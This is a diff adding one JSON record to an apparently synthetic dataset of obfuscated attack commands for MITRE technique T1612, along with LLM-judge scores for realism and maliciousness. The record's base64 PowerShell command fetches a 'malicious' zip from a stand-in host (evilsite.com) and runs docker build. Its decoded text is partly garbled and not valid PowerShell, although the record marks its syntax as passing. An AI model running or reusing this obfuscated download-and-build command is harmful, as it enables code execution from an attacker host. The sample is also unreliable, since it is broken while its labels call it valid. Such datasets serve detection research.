@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1612",
+  "platform": "windows",
+  "shell": "powershell",
+  "command": "IWRodHRwOi8vZXZpbHNpdGUuY29tL21hbGljaW91cy56aXAgfCBEb3dubG9hZEZpbGUgLURlc3RpbmF0aW9uIEIoXCdwYXRoIFwoLypwYXNzd2Q1IDApZnJvbUJhc2U2NCg/TFMyKSArIDI/IDQqK2R3LnppcCcpOyBjZCBcJ3BhdGgnOyBkb2NrZXIgYnVpbGQgLi8=",
+  "explanation": "Downloads a malicious zip file containing a Dockerfile and executes docker build, using obfuscated URLs and paths.",
+  "rationale_steps": [
+    "Fetch a Dockerfile wrapped within a zip from an external source using an encoded URL.",
+    "Unpack and build the Docker image from the fetched Dockerfile."
+  ],
+  "obfuscation_level": "heavy",
+  "id": "SYN-POWERSHELL-T1612-a1e45944-7b12f924",
+  "source_prompt_hash": "a1e45944",
+  "timestamp_utc": "2025-07-10T23:26:57.491155Z",
+  "validation": {
+    "syntax_ok": {
+      "pass": true,
+      "forbidden_tokens": false,
+      "obfuscation_suspicious": false,
+      "obfuscation_entropy": 5.57,
+      "command_length": 200
+    },
+    "llm_judgments": [
+      {
+        "model": "gpt-4-turbo",
+        "score": 0.87,
+        "category_fit": 0.9,
+        "attack_realism": 0.85,
+        "maliciousness": 0.9,
+        "technical_plausibility": 0.9,
+        "privilege_relevance": 0.7,
+        "reason": "The sample fits because it involves building a container image directly on the host, which is aligned with the T1612 description. It is technically plausible and realistic with a high degree of maliciousness, but the privilege relevance is lower since no specific higher privileges are required to execute the observed attack.",
+        "timestamp": "2025-07-12T18:22:47.019995Z"
+      },
+      {
+        "model": "claude-3-opus-20240229",
+        "category_fit": 1.0,
+        "attack_realism": 0.9,
+        "maliciousness": 0.8,
+        "technical_plausibility": 0.9,
+        "privilege_relevance": 0.7,
+        "score": 0.89,
+        "reason": "Sample demonstrates building malicious container image on host via docker build command, matching T1612's core behavior of bypassing defenses through local image building.",
+        "timestamp": "2025-07-14T04:29:58.140728Z"
+      }
+    ],
+    "llm_average_submetrics": {
+      "category_fit": 0.95,
+      "attack_realism": 0.875,
+      "maliciousness": 0.85,
+      "technical_plausibility": 0.9,
+      "privilege_relevance": 0.7
+    },
+    "llm_average_score": 0.88,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
